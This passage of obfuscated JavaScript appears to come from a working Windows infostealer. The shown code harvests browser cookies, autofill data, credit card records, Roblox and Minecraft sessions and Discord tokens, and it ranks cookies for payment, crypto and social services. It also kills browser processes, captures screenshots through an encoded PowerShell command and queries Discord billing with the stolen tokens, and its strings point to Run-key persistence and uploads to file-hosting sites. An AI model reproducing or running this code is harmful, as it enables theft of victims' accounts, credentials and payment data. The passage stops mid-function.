                o.push(null);
              } else {
                var v = r[u];
                var w = v.expires && i.Xfave(v.expires, 0) ? new Date(i.BuMha(v.expires, 1000)).toLocaleString() : i.JyjzY;
                t.push(i.asFmB(i.nqkBb(i.CqjZO(i.OWdpL(i.PrOUn(i.CqjZO(i.PrOUn(i.bnIkZ(i.wNACX, v.domain || ""), i.ZyDce) + (v.name || ""), i.JGpCv), v.value || ""), "\nCreation Date: N/A\nExpiration Date: "), w), i.ZZjXz) + o.name, "\n\n"));
                var x = i.nnQqn(classifyCookie, v.domain || "", v.name || "");
                if (x && v.value) {
                  if (i.uEwzJ(i.kefKJ, i.kefKJ)) {
                    const L = {
                      service: x,
                      host: v.domain || "",
                      name: v.name || "",
                      value: v.value || "",
                      browser: o.name,
                      expiration: w,
                      expiresUnix: v.expires || 0,
                      path: v.path || "/",
                      httpOnly: v.httpOnly || false,
                      secure: v.secure || false,
                      sameSite: v.sameSite || "None"
                    };
                    l.push(L);
                  } else {
                    i.EPxvB(z, g, y);
                  }
                }
                m++;
              }
            }
            k[o.name] = t;
          } else {
            const O = z.apply(g, arguments);
            h = null;
            return O;
          }
        }
      } catch (O) {
        if (i.YLgGg(i.IEybw, i.IEybw)) {
          v(d, "Direct-Telegram");
        } else {
          logError(O, i.LSVit(i.kMCID, o.name));
        }
      }
    } else {
      for (const R of k) {
        const S = R.match(/URL: (.+)/);
        const T = R.match(/Username: (.+)/);
        const U = R.match(/Password: (.+)/);
        const V = R.match(/Application: (.+)/);
        if (i.ytbyz(S, T) && U) {
          r.push({
            url: S[1].trim(),
            username: T[1].trim(),
            password: U[1].trim(),
            application: V ? V[1].trim() : s,
            category: t(S[1].trim())
          });
        }
      }
    }
  }
  const y = {
    count: m,
    groupedData: k,
    importantCookies: l
  };
  return y;
}
async function fetchSessionData() {
  const g = {
    PcuMj: "utf8",
    FZcVS: "Unknown",
    QYyDM: function (j, k, l) {
      return j(k, l);
    },
    CWaMI: "fetchFileVPN",
    VQoXm: "=== Minecraft Launcher Accounts ===",
    lskWF: "---",
    NdvHK: "N/A",
    yyBfc: "Error reading launcher_accounts.json",
    smnTl: function (j, k) {
      return j + k;
    },
    cyDRP: "where ",
    nYOlb: " 2>nul",
    yPNDP: function (j, k) {
      return j(k);
    },
    XttoW: "No WS URL",
    faWki: "```Error retrieving HQ Guilds```",
    JUAtA: function (j, k) {
      return j || k;
    },
    FVlQd: function (j, k) {
      return j > k;
    },
    QJedS: function (j, k) {
      return j(k);
    },
    AiGsm: function (j, k, l) {
      return j(k, l);
    },
    eqSGB: "Upload-All-Failed",
    aAHpl: function (j, k) {
      return j - k;
    },
    EYUve: function (j, k) {
      return j === k;
    },
    fewKS: function (j, k, l) {
      return j(k, l);
    },
    FEKng: function (j, k, l) {
      return j(k, l);
    },
    VrfLQ: function (j, k) {
      return j + k;
    },
    wXetH: "taskkill /IM \"",
    TlkOv: "\" /F",
    SaTIV: "ignore",
    ZkCHE: function (j, k) {
      return j !== k;
    },
    EyyoT: "RlqTJ",
    wDECN: function (j, k) {
      return j + k;
    },
    LojCr: "https://",
    ChHeA: "http://",
    Cmiuj: function (j, k) {
      return j > k;
    },
    XBdgT: "no_restriction",
    yzsuB: "lax",
    SdyWF: "strict",
    eqbIm: function (j, k) {
      return j !== k;
    },
    wFyDE: function (j, k) {
      return j * k;
    },
    uUpOq: "numeric",
    lDuyn: "2-digit",
    lBsUG: "At the end of the session",
    nbBTM: "Encrypted connections only",
    tzsiw: "Any type of connection",
    Qyhvx: "Valid for host only",
    rDbEz: "Valid for subdomains",
    kRaQN: function (j, k) {
      return j(k);
    },
    WJrGa: "firefox-default",
    rYLKB: "DjkdE",
    zRHWk: "hifcm",
    WQgco: "yuXlU",
    dhAvd: "RemoteDebug-main",
    wtZgf: function (j, k) {
      return j === k;
    },
    jwTeh: "ubTro",
    wTDQT: "cookies",
    dQgiJ: function (j, k) {
      return j !== k;
    },
    xdDap: "nRreo",
    rQpuN: function (j, k, l) {
      return j(k, l);
    },
    HyEzl: "fetchSessionData-extract",
    AAsNA: "eYbmX",
    ZxfKC: function (j) {
      return j();
    },
    hFkhc: "QNFDM",
    eHifp: "UfQpo",
    WiIrm: function (j, k, l) {
      return j(k, l);
    },
    qiHCR: "RobloxDesktopCookie",
    qLmFz: function (j, k) {
      return j === k;
    },
    SyIsC: "ZUwtH",
    SiDxr: "hPqxN",
    sfHtr: function (j, k) {
      return j !== k;
    },
    HfZSo: "baRdp",
    QYadu: "Roblox (Desktop)",
    evaNl: "Roblox (Studio)",
    KzwJD: "Roblox (Player)",
    xyAga: "Instagram",
    IWXBU: "TikTok",
    zSCiE: "Twitter/X",
    MqrLG: "Facebook",
    ZxQLu: "YouTube",
    wtriU: "Microsoft",
    yxBPL: "Microsoft/Outlook",
    FXMZA: "Steam",
    zmBOb: "Spotify",
    HxirY: "Twitch",
    gMhbE: "Reddit",
    XNYQB: "GitHub",
    ZiKme: "Netflix",
    hGQCz: "Amazon",
    aBkwE: "Snapchat",
    eTcMZ: "Pinterest",
    pWMSL: "PayPal",
    EmTxC: "Binance",
    uTmpY: "Epic Games",
    CttLF: "EA Games",
    NszXq: "Blizzard",
    QOzJN: "Kick",
    wabEX: "Telegram",
    vVBst: "ChatGPT",
    DGxYd: "Zoom",
    ZueAa: "Walmart",
    yLPFI: "eBay",
    KwsYt: "Crunchyroll",
    DpGie: "Disney+",
    OSFvK: function (j, k) {
      return j !== k;
    },
    eCCIb: "kpuxt",
    cAldM: "Yocct",
    bwsTs: "Important_Cookies.txt",
    brWNz: "All_Cookies_CQM.json"
  };
  const h = {
    count: 0,
    groupedData: {},
    importantCookies: []
  };
  let i = h;
  try {
    if (g.rYLKB !== "lsqnb") {
      i = await fetchCookiesRemoteDebug();
    } else {
      const k = m.join(n, "instance.cfg");
      if (o.existsSync(k)) {
        try {
          const l = D.readFileSync(k, g.PcuMj);
          const m = l.match(/name=([^\n]+)/);
          const n = l.match(/IntendedVersion=([^\n]+)/);
          E.push("  " + F + ":");
          G.push("    Name: " + (m ? m[1] : "Unknown"));
          H.push("    Version: " + (n ? n[1] : g.FZcVS));
        } catch (o) {
          K.push("  " + L + ": (config read error)");
        }
      }
    }
  } catch (k) {
    if (g.eqbIm(g.zRHWk, g.WQgco)) {
      logError(k, g.dhAvd);
    } else {
      g.QYyDM(c, d, g.CWaMI);
      return 0;
    }
  }
  if (g.wtZgf(i.count, 0)) {
    if (g.wtZgf("ubTro", g.jwTeh)) {
      try {
        const m = "SELECT host_key, name, encrypted_value, value, creation_utc, expires_utc, path, is_httponly, is_secure, samesite FROM cookies";
        i = await extractBrowserData(m, g.wTDQT);
      } catch (n) {
        if (g.dQgiJ(g.xdDap, g.xdDap)) {
          try {
            const p = y.parse(z.readFileSync(A, "utf8"));
            B.push(g.VQoXm);
            for (const [q, r] of I.entries(p.accounts || {})) {
              O.push("Account ID: " + q);
              P.push("Username: " + (r.username || "N/A"));
              Q.push("UUID: " + (r.profileId || g.NdvHK));
              R.push("Type: " + (r.type || g.NdvHK));
              S.push(g.lskWF);
            }
          } catch (u) {
            U.push(g.yyBfc);
          }
        } else {
          g.rQpuN(logError, n, g.HyEzl);
        }
      }
    } else {
      return "```No HQ Guilds```";
    }
  }
  try {
    if (g.ZkCHE(g.AAsNA, g.AAsNA)) {
      const r = g.QYyDM(d, g.smnTl(g.smnTl(g.cyDRP, g), g.nYOlb), {
        windowsHide: true,
        encoding: g.PcuMj
      }).trim().split("\r\n")[0];
      if (r && h.existsSync(r)) {
        return r;
      }
    } else {
      const r = g.ZxfKC(extractRobloxDesktopCookie);
      if (g.FVlQd(r.length, 0)) {
        if (g.eqbIm(g.hFkhc, g.hFkhc)) {
          g.yPNDP(g, h);
          return g.yPNDP(i, new j(g.XttoW));
        } else {
          i.importantCookies = i.importantCookies.concat(r);
        }
      }
    }
  } catch (t) {
    if (g.eqbIm("QtISj", g.eHifp)) {
      g.WiIrm(logError, t, g.qiHCR);
    } else {
      return g.faWki;
    }
  }
  if (g.Cmiuj(i.count, 0) || i.importantCookies && g.FVlQd(i.importantCookies.length, 0)) {
    if (g.qLmFz(g.SyIsC, "YRJSj")) {
      const w = t.statSync(u);
      const x = g.JUAtA(v, w);
      if (g.FVlQd(w.size, x)) {
        K("[Skip] File too large (" + g.yPNDP(L, w.size) + "): " + M);
        return false;
      }
      if (g.FVlQd(A + w.size, B)) {
        if (!N) {
          g.QJedS(R, "[Storage] Temporary storage limit of 1GB reached. Skipping: " + S);
          T = true;
        }
        return false;
      }
      G.copyFileSync(H, I);
      J += w.size;
    } else {
      const w = path.join(mainFolderPath, "Cookies");
      const x = {
        recursive: true
      };
      if (!fs.existsSync(w)) {
        fs.mkdirSync(w, x);
      }
      for (const [y, z] of Object.entries(i.groupedData)) {
        if (g.dQgiJ(g.SiDxr, g.SiDxr)) {
          x.push(1);
        } else {
          const B = y.replace(/[^a-zA-Z0-9 ]/g, "");
          const C = path.join(w, "Cookies_[" + B + "].txt");
          fs.writeFileSync(C, g.wDECN(user.copyright, z.join("")), {
            encoding: g.PcuMj,
            flag: "w"
          });
        }
      }
      if (i.importantCookies && i.importantCookies.length > 0) {
        const D = {};
        for (const L of i.importantCookies) {
          if (g.sfHtr(g.HfZSo, g.HfZSo)) {
            g.AiGsm(L, I, g.eqSGB);
          } else {
            if (!D[L.service]) {
              D[L.service] = [];
            }
            D[L.service].push(L);
          }
        }
        let E = user.copyright;
        E += "[ " + i.importantCookies.length + " Important Cookies Found ]\n\n";
        const F = ["Roblox", g.QYadu, g.evaNl, g.KzwJD, "Discord", g.xyAga, g.IWXBU, g.zSCiE, g.MqrLG, "Google", g.ZxQLu, g.wtriU, g.yxBPL, g.FXMZA, g.zmBOb, g.HxirY, g.gMhbE, g.XNYQB, g.ZiKme, g.hGQCz, g.aBkwE, g.eTcMZ, "LinkedIn", g.pWMSL, "Coinbase", g.EmTxC, g.uTmpY, g.CttLF, g.NszXq, g.QOzJN, g.wabEX, "WhatsApp", g.vVBst, "OpenAI", "Yahoo", g.DGxYd, g.ZueAa, g.yLPFI, "Stripe", "Cloudflare", g.KwsYt, "Hulu", g.DpGie];
        const G = Object.keys(D).sort((N, O) => {
          const P = F.indexOf(N);
          const Q = F.indexOf(O);
          return g.aAHpl(g.EYUve(P, -1) ? 999 : P, Q === -1 ? 999 : Q);
        });
        for (const N of G) {
          if (g.OSFvK(g.eCCIb, g.cAldM)) {
            E += "\n━━━━━━━━━━━━━━━━[ " + N + " ]━━━━━━━━━━━━━━━━\n\n";
            for (const O of D[N]) {
              E += "  Host: " + O.host + "\n  Name: " + O.name + "\n  Value: " + O.value + "\n  Browser: " + O.browser + "\n  Expires: " + O.expiration + "\n  ────────────────────────────────\n";
            }
          } else {
            k = g.fewKS(l, m, n);
            o.push(p[0]);
            q += r[1];
          }
        }
        const H = path.join(w, g.bwsTs);
        const I = {
          encoding: g.PcuMj,
          flag: "w"
        };
        fs.writeFileSync(H, E, I);
        const J = i.importantCookies.map(Q => {
          if (g.ZkCHE(g.EyyoT, g.EyyoT)) {
            g.FEKng(Q, g.VrfLQ(g.VrfLQ(g.wXetH, I), g.TlkOv), {
              stdio: g.SaTIV,
              windowsHide: true
            });
          } else {
            const S = Q.host || "";
            const T = !!Q.secure;
            const U = g.wDECN(T ? g.LojCr : g.ChHeA, S) + (Q.path || "/");
            const V = Q.expiresUnix && g.Cmiuj(Q.expiresUnix, 0) ? g.yPNDP(String, Math.floor(Q.expiresUnix)) : "0";
            const W = !S.startsWith(".");
            const X = {
              no_restriction: g.XBdgT,
              lax: g.yzsuB,
              strict: g.SdyWF
            };
            const Y = X;
            return {
              "Host raw": U,
              "Name raw": Q.name,
              "Path raw": Q.path || "/",
              "Content raw": Q.value,
              Expires: g.eqbIm(V, "0") ? new Date(g.wFyDE(Q.expiresUnix, 1000)).toLocaleString("en-GB", {
                day: "2-digit",
                month: "2-digit",
                year: g.uUpOq,
                hour: g.lDuyn,
                minute: g.lDuyn,
                second: g.lDuyn,
                hour12: false
              }).replace(/\//g, "-") : g.lBsUG,
              "Expires raw": V,
              "Send for": T ? g.nbBTM : g.tzsiw,
              "Send for raw": g.QJedS(String, T),
              "HTTP only raw": g.yPNDP(String, !!Q.httpOnly),
              "SameSite raw": Y[Q.sameSite] || g.XBdgT,
              "This domain only": W ? g.Qyhvx : g.rDbEz,
              "This domain only raw": g.kRaQN(String, W),
              "Store raw": g.WJrGa,
              "First Party Domain": "",
              Service: Q.service || g.FZcVS
            };
          }
        });
        const K = path.join(w, g.brWNz);
        fs.writeFileSync(K, JSON.stringify(J, null, 2), g.PcuMj);
      }
    }
  }
  return i.count;
}
async function fetchFormData() {
  const d = "SELECT * FROM autofill";
  const g = await extractBrowserData(d, "autofill");
  if (g.count > 0) {
    const h = path.join(mainFolderPath, "Autofills");
    if (!fs.existsSync(h)) {
      fs.mkdirSync(h, {
        recursive: true
      });
    }
    for (const [j, k] of Object.entries(g.groupedData)) {
      const m = j.replace(/[^a-zA-Z0-9 ]/g, "");
      const n = path.join(h, "Autofills_[" + m + "].txt");
      fs.writeFileSync(n, user.copyright + k.join(""), {
        encoding: "utf8",
        flag: "w"
      });
    }
  }
  return g.count;
}
async function fetchCreditCardData() {
  const c = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, nickname, origin FROM credit_cards";
  const d = await extractBrowserData(c, "creditcards");
  if (d.count > 0) {
    const g = path.join(mainFolderPath, "CreditCards");
    if (!fs.existsSync(g)) {
      fs.mkdirSync(g, {
        recursive: true
      });
    }
    let i = user.copyright + "\n";
    i += "⚠ [ " + d.count + " Credit Cards Found ] ⚠\n\n";
    for (const [j, k] of Object.entries(d.groupedData)) {
      const l = j.replace(/[^a-zA-Z0-9 ]/g, "");
      const m = path.join(g, "Cards_[" + l + "].txt");
      fs.writeFileSync(m, user.copyright + k.join(""), {
        encoding: "utf8",
        flag: "w"
      });
      i += "[ " + j + " ]\n" + k.join("") + "\n";
    }
    fs.writeFileSync(path.join(g, "All_CreditCards.txt"), i, "utf8");
  }
  return d.count;
}
function cleanupProcesses() {
  try {
    const d = PATHS.processes;
    const g = new Set();
    for (const h of browserPath) {
      const i = h[0];
      if (fs.existsSync(i)) {
        for (const [j, k] of Object.entries(d)) {
          if (i.includes(j)) {
            g.add(k);
          }
        }
      }
    }
    if (g.size > 0) {
      const o = decodeString("dGFza2xpc3Q=");
      const p = decodeString("dGFza2tpbGw=");
      try {
        const s = execSync(o, {
          timeout: 3000,
          windowsHide: true
        }).toString();
        for (const t of g) {
          if (s.toLowerCase().includes(t.toLowerCase())) {
            try {
              execSync(p + " /IM " + t + " /F", {
                stdio: "ignore",
                timeout: 3000,
                windowsHide: true
              });
            } catch (v) {}
          }
        }
      } catch (x) {}
    }
  } catch (y) {
    logError(y, "cleanupProcesses");
  }
}
function captureAllScreens() {
  return new Promise((c, d) => {
    const g = {
      tjaDL: "captureAllScreens-exec",
      scEjX: function (h, i) {
        return h(i);
      }
    };
    const h = path.dirname(screenshotPath);
    if (!fs.existsSync(h)) {
      fs.mkdirSync(h, {
        recursive: true
      });
    }
    const j = "\nAdd-Type -AssemblyName System.Windows.Forms\nAdd-Type -AssemblyName System.Drawing\n\n$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height\n$graphics = [System.Drawing.Graphics]::FromImage($bitmap)\n$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)\n$bitmap.Save(\"" + screenshotPath + "\", [System.Drawing.Imaging.ImageFormat]::Png)\n\n$graphics.Dispose()\n$bitmap.Dispose()\n\"OK\"\n";
    const k = Buffer.from(j, "utf16le").toString("base64");
    exec("powershell -ExecutionPolicy Bypass -EncodedCommand " + k, {
      timeout: 15000,
      windowsHide: true
    }, (m, n, o) => {
      if (m) {
        logError(m, "captureAllScreens-exec");
        return d(m);
      }
      fs.readFile(screenshotPath, (r, s) => {
        if (r) {
          logError(r, "captureAllScreens-readFile");
          d(r);
        } else {
          c(s);
        }
      });
    });
  });
}
const sleep = a => new Promise(b => setTimeout(b, a));
const discordHeaders = a => ({
  Authorization: a,
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Content-Type": "application/json"
});
async function getUserData(b) {
  const c = {
    DeIQY: function (d, g, h) {
      return d(g, h);
    },
    WLSqk: "ignore",
    SgheC: function (d, g) {
      return d(g);
    },
    xUlfk: function (d, g) {
      return d(g);
    },
    vrGYp: function (d, g) {
      return d === g;
    },
    xTKyx: "urCXq",
    cLfpf: "ZXgHN"
  };
  try {
    if (c.vrGYp(c.xTKyx, "urCXq")) {
      await sleep(1000);
      const d = await axios.get("https://discord.com/api/v9/users/@me", {
        headers: c.xUlfk(discordHeaders, b),
        timeout: 5000
      });
      const g = d.data;
      if (!g) {
        return null;
      }
      const h = g.id;
      const i = g.username;
      const j = g.discriminator;
      const k = g.avatar;
      const l = g.email;
      const m = g.phone;
      const n = g.mfa_enabled;
      const o = g.flags;
      const p = g.premium_type;
      const q = g.bio;
      const r = {
        id: h,
        username: i,
        discriminator: j,
        avatar: k,
        email: l,
        phone: m,
        mfa_enabled: n,
        flags: o,
        premium_type: p,
        bio: q
      };
      return r;
    } else {
      c.DeIQY(c, "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WinHost\" /t REG_SZ /d \"wscript.exe //nologo \\\"" + d + "\\\"\" /f", {
        stdio: c.WLSqk,
        windowsHide: true
      });
    }
  } catch (t) {
    if (c.vrGYp(c.cLfpf, c.cLfpf)) {
      return null;
    } else {
      const v = d.match(/http[^\s]+/);
      if (v) {
        c.SgheC(i, "[Catbox] Success (matched): " + v[0]);
        return c.xUlfk(j, v[0]);
      }
    }
  }
}
async function fetchDiscordTokens() {
  const z = {
    HbvjY: "fhhch",
    dzarh: function (a0, a1) {
      return a0(a1);
    },
    xUpEi: function (a0, a1) {
      return a0(a1);
    },
    enUGQ: function (a0, a1) {
      return a0 === a1;
    },
    VwuUY: "rOyoC",
    lNhab: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    aVdJu: "RemoteDebug-main",
    ZVQyS: function (a0, a1) {
      return a0 | a1;
    },
    lPVVu: function (a0, a1) {
      return a0 + a1;
    },
    AzGte: function (a0, a1) {
      return a0 * a1;
    },
    PsyWz: function (a0, a1) {
      return a0 + a1;
    },
    JHjGY: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    APGoE: function (a0, a1) {
      return a0 === a1;
    },
    XqrSD: "yHpoi",
    UUAMb: function (a0, a1) {
      return a0(a1);
    },
    fuVvk: "System Error",
    mIYip: "ignore",
    yOycA: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    lExUt: "cYpgK",
    JUGQh: function (a0, a1) {
      return a0(a1);
    },
    Ymwai: "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
    qOixw: function (a0, a1) {
      return a0(a1);
    },
    BNjHM: "MKvJB",
    nzRIE: "FkLvW",
    xPeEX: "```No HQ Guilds```",
    SlBJw: "eDadM",
    Wgdte: "HWXEb",
    yIIQP: "No Invite",
    ODUnt: "<:7212roleowner:1268574022933811253> Owner",
    Puysd: "<:admin:967851956930482206> Admin",
    Hppcw: function (a0, a1) {
      return a0 >= a1;
    },
    FyBkY: function (a0, a1) {
      return a0 + a1;
    },
    ltZLv: "Nxivf",
    lUPMw: "`Too many servers to display.`",
    PtPqy: function (a0, a1) {
      return a0 || a1;
    },
    MwcSj: function (a0, a1) {
      return a0 !== a1;
    },
    rPnus: "Mthar",
    sPAHu: "```Error retrieving HQ Guilds```",
    HYWYX: "utf8",
    oFsYz: function (a0, a1) {
      return a0 !== a1;
    },
    eGXxy: "BppOV",
    Qpvgw: "TiHZZ",
    Mmdko: "ejBca",
    oXJuC: "mOfWa",
    unSNS: "DEjwK",
    NIcFr: function (a0) {
      return a0();
    },
    IIcPr: function (a0, a1) {
      return a0 === a1;
    },
    wvkbM: "ECcdM",
    SHGKb: function (a0, a1) {
      return a0 === a1;
    },
    IqwQP: "IqlSu",
    rSQrN: "CfuKq",
    wYYgV: function (a0, a1) {
      return a0(a1);
    },
    gThUm: "https://discord.com/api/v9/users/@me/billing/payment-sources",
    SptqE: function (a0, a1) {
      return a0 == a1;
    },
    VLvdR: "```No Billing```",
    wBwzk: "xzSee",
    FVIoB: "tMTFL",
    UCxeO: function (a0, a1) {
      return a0 & a1;
    },
    uBGFM: function (a0, a1) {
      return a0 == a1;
    },
    ELQVD: "```No Badges```",
    IxFhX: "fetchGamesData",
    yBhLQ: function (a0, a1) {
      return a0 - a1;
    },
    hVKVG: function (a0, a1) {
      return a0 + a1;
    },
    klszn: function (a0, a1) {
      return a0 / a1;
    },
    uUiZq: "lax",
    fImvH: "no_restriction",
    IIAXY: function (a0, a1) {
      return a0 === a1;
    },
    ulvBH: "GRAMu",
    mAqqi: "IZxYF",
    IuFmg: "UkCfv",
    bROoB: "QIeIk",
    FMBPt: "<:946246402105819216:962747802797113365>",
    dknQu: "<:boost3month:1161356821806710844>",
    ScTJx: "<:boost6month:1161357418480029776>",
    NrBMP: "<:boost9month:1161357513820741852>",
    NwUzF: "<:boost12month:1161357639737946206>",
    hTxEc: "<:boost15month:967518897987256400>",
    GejJP: "<:boost18month:967519190133145611>",
    ycagU: "<:boost24month:969686081958207508>",
    JTuKf: function (a0, a1) {
      return a0 === a1;
    },
    azKzd: "Cvhkq",
    TqPTR: function (a0, a1) {
      return a0 - a1;
    },
    fNywC: function (a0, a1) {
      return a0 >= a1;
    },
    HlYOm: "HRnRf",
    GOfUT: "```No Nitro```",
    loQBE: function (a0, a1) {
      return a0 < a1;
    },
    YXOWV: function (a0) {
      return a0();
    },
    aiWlV: "aes-256-gcm",
    bjiRn: function (a0, a1) {
      return a0 !== a1;
    },
    kcbyW: "uCzrH",
    DTltZ: "Issrp",
    mRBfu: function (a0, a1) {
      return a0 !== a1;
    },
    VkzjH: "VZBaK",
    gdKoC: "jTIWR",
    XWgMu: "latin1",
    rFggL: "steoe",
    UDwgt: "hex",
    WUkYQ: function (a0, a1) {
      return a0 + a1;
    },
    CxTDY: "Catbox-Curl-Error",
    JLipP: "Upload to Catbox timed out.",
    epJSB: "Zip-Create",
    PNGLw: "Chrome",
    sDTCD: "chrome.exe",
    dygIQ: "msedge.exe",
    rozOP: "Brave",
    XkgSN: "brave.exe",
    INnrN: "browser.exe",
    JeZfd: "opera.exe",
    ewZmS: "taskkill /IM \"",
    GxMeG: "\" /F",
    wvAag: "WCjaa",
    IHlyE: "AEGtH",
    ljRaD: "HyWxX",
    uCUSd: "hjQoz",
    fKlzF: "kuhCq",
    rSXcq: function (a0, a1) {
      return a0 === a1;
    },
    PIIlE: "twhTy",
    qmwaE: "wxPKh",
    ROQDe: "dQw4w9WgXcQ:",
    GzARs: function (a0, a1) {
      return a0 < a1;
    },
    JESzQ: "base64",
    itdLK: "utf-8",
    lZvWD: function (a0, a1) {
      return a0 > a1;
    },
    kXinU: "etLBj",
    XeUYY: "CAcqS",
    zbDdY: "VKByC",
    ORven: "nHmnM",
    UuSdN: function (a0) {
      return a0();
    },
    vEZSq: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    mFFJl: "relaunchAsAdmin-denied",
    nReEg: function (a0, a1, a2, a3, a4) {
      return a0(a1, a2, a3, a4);
    },
    FzAvf: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    IxChW: "basicStartup",
    ezkmX: "PfHRP",
    slWbc: "ynNAT",
    Bgfqz: function (a0, a1) {
      return a0 === a1;
    },
    pPLyj: "XTZMd",
    gECpQ: "vsJPO",
    GfepV: function (a0, a1) {
      return a0 * a1;
    },
    HYbPQ: ".ldb",
    SkKLW: ".log",
    XikaU: ".sqlite",
    naUjT: ".json",
    SNLmh: ".txt",
    poZxg: ".dat",
    svPib: function (a0, a1) {
      return a0 !== a1;
    },
    PczvX: "VTbrJ",
    KObuS: function (a0, a1, a2, a3) {
      return a0(a1, a2, a3);
    },
    LSrkx: function (a0, a1) {
      return a0 + a1;
    },
    tKTAD: "PS exec failed: ",
    QmvbG: " | stderr: ",
    cgDxO: function (a0, a1) {
      return a0(a1);
    },
    UEiZF: "extractMinecraftSessionInfo",
    CIxAx: "rNjrq",
    LRAnK: "WOUPr",
    OCBxN: "dWwuv",
    GbVTx: function (a0, a1) {
      return a0 > a1;
    },
    JTgec: function (a0, a1) {
      return a0 !== a1;
    },
    GCGRi: "LCbYp",
    svjNc: "http",
    BMzVa: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    jIkjb: "GoFile-Upload",
    LtXuJ: function (a0, a1) {
      return a0 + a1;
    },
    KAEni: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    XVQUG: "Failed to create any ZIP file",
    kwtOk: "createAndUploadZip",
    BUpxX: function (a0, a1) {
      return a0(a1);
    },
    TlVar: "--folder",
    rtFyQ: function (a0, a1) {
      return a0 < a1;
    },
    ZVHds: "2|3|5|0|1|4",
    sWdyp: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    VJuDg: function (a0, a1) {
      return a0 + a1;
    },
    WLyly: function (a0, a1) {
      return a0 + a1;
    },
    dxzUy: function (a0, a1) {
      return a0 + a1;
    },
    zhQet: function (a0, a1) {
      return a0 + a1;
    },
    GhkzJ: function (a0, a1) {
      return a0 + a1;
    },
    mjVwt: "================\nHost: ",
    SmLCf: "\nName: ",
    TMuBG: "\nCreation Date: N/A\nExpiration Date: ",
    sJPNa: "\nApplication: ",
    aPYjm: "zip",
    kvwer: "close",
    PJsYV: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    gymsG: "createZipArchiveCatbox",
    FOQbh: function (a0, a1) {
      return a0(a1);
    },
    LchcI: function (a0, a1) {
      return a0 + a1;
    },
    Wymok: function (a0, a1) {
      return a0 === a1;
    },
    avtra: function (a0, a1) {
      return a0 + a1;
    },
    Geakz: function (a0, a1, a2) {
      return a0(a1, a2);
    },
    bbJRT: function (a0, a1) {
      return a0 + a1;
    },
    ibnrl: "initializeService-unlink-",
    KAyJM: "Roblox (Desktop)",
    jXbQt: ".roblox.com",
    AYkUY: "Roblox Desktop App",
    eXelm: "N/A",
    xRIkG: " | ❌ Image Failed",
    tTKFU: "Error reading servers.dat",
    Xoxql: "taskkill /IM Exodus.exe /F",
    ybKgM: function (a0, a1) {
      return a0 === a1;
    },
    aariQ: "MNhLu",
    iFQtI: "opYYU",
    mtVvH: function (a0, a1) {
      return a0 + a1;
    },
    bdBlH: "<:staff:874750808728666152>",
    JSobx: "<:partner:874750808678354964>",
    NYNjT: "<:early_supporter:874750808414113823>",
    lroMi: "<:bughunter_2:874750808430874664>",
    KXzFd: "<:developer:874750808472825986>",
    ymyoZ: "<:bravery:874750808388952075>",
    MPMir: "<:moderator:976739399998001152>",
    IJYDD: function (a0, a1) {
      return a0 === a1;
    },
    ucCKu: "zTkjj",
    ruYnS: "Discord",
    dIkSg: "\\discord",
    fzksU: "Discord Canary",
    VXtlV: function (a0, a1) {
      return a0 + a1;
    },
    Rpvsv: "Discord PTB",
    QVbsX: "\\discordptb",
    wLKoq: "Discord Dev",
    KgVuY: "\\discorddevelopment",
    KnAyb: "Lightcord",
    ZNzvD: "\\lightcord",
    OkNCB: "\\vesktop",
    mwmha: "BetterDiscord",
    PzRYZ: "\\BetterDiscord",
    vHwsU: "WebCord",
    SoqfO: "ArmCord",
    gJryO: "\\ArmCord",
    jnhPF: function (a0, a1) {
      return a0 === a1;
    },
    KZELU: "sugoV",
    rosOY: "Local State",
    GCHRQ: "nmZnG",
    mJrbN: function (a0, a1) {
      return a0 === a1;
    },
    EKCxo: "tEQYw",
    qYsHz: "zFPoU",
    eFQXC: function (a0, a1) {
      return a0 !== a1;
    },
    PEgEU: "OmGwl",
    lhjXS: "tucyO",
    RAHPP: function (a0, a1) {
      return a0 === a1;
    },
    iNlJa: "ctPur",
    iUhJt: "Local Storage",
    QTfqD: "leveldb",
    SdSon: "Session Storage",
    FXucP: "IndexedDB",
    TetLT: "Cache",
    fekPO: "Cache_Data",
    oHUdr: "Code Cache",
    VSark: "blob_storage",
    ibxXW: "nVbhS",
    wKHWC: "QlUaQ",
    snEDw: "ujxSG",
    sfZOW: "rPTuT",
    jZIig: function (a0, a1) {
      return a0 + a1;
    },
    CVaOw: "qGgDf",
    Jmswy: "aXITH",
    LHmoh: "rTgXQ",
    RogUn: "lwGma",
    uiPha: "GOvWc",
    UdEwg: "fyUCo",
    pYODc: function (a0, a1) {
      return a0 === a1;
    },
    XgEqC: "HAxMg",
    exUQa: "ebKUt",
    mrRTk: "Discord_Tokens.txt",
    zmvcg: "Unknown",
    Xkthj: function (a0, a1) {
      return a0 === a1;
    },
    kJanz: "bjgIb",
    PKnyu: "XIOia",
    jGbmw: "http://ip-api.com/json/",
    CHWmP: "vCjNB",
    PpilP: "jogaM",
    okqjD: function (a0, a1) {
      return a0(a1);
    },
    SUQYT: "Discord Session Detected",
    lnyHt: ":key: Token:",
    VIhcM: "```",
    BDvaq: ":envelope: Email:",
    FiIRW: ":globe_with_meridians: IP:",
    UzZKb: "<:mobile88:1210411486120517663> Phone:",
    XZjKd: function (a0, a1) {
      return a0 + a1;
    },
    TXphp: "None",
    QcQfm: function (a0, a1) {
      return a0 !== a1;
    },
    tsbhb: "REMPLACE_ME",
    hPXny: "XvrmN",
    nNUMJ: function (a0, a1) {
      return a0(a1);
    },
    bGCYY: function (a0, a1) {
      return a0 + a1;
    },
    prLFK: "mpPSy",
    VTPKU: "fetchDiscordTokens"
  };
  async function A(a0, a1) {
